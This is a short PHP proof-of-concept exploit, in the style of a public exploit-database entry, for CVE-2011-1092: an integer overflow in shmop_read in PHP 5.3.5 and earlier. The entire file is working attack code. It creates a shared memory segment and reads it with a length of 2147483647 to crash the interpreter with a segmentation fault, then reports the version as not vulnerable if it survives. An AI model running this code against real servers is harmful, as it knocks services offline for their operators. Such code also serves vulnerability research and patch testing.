<?php
# Exploit Title: PHP <=5.3.5 Integer Overflow DoS
# Date: 12-03-11
# Author: Jose Carlos Norte - www.rooibo.com
# Software Link: www.php.net
# Version: <= 5.3.5
# Tested on: Ubuntu Linux
# CVE : CVE-2011-1092
 
$shm_key = ftok(__FILE__, 't');
$shm_id = shmop_open($shm_key, "c", 0644, 100);
$shm_data = shmop_read($shm_id, 1, 2147483647);
//if there is no segmentation fault past this point, we have 2gb of memory!
//or we are in a patched php
echo "this php version is not vulnerable!";
 
?>
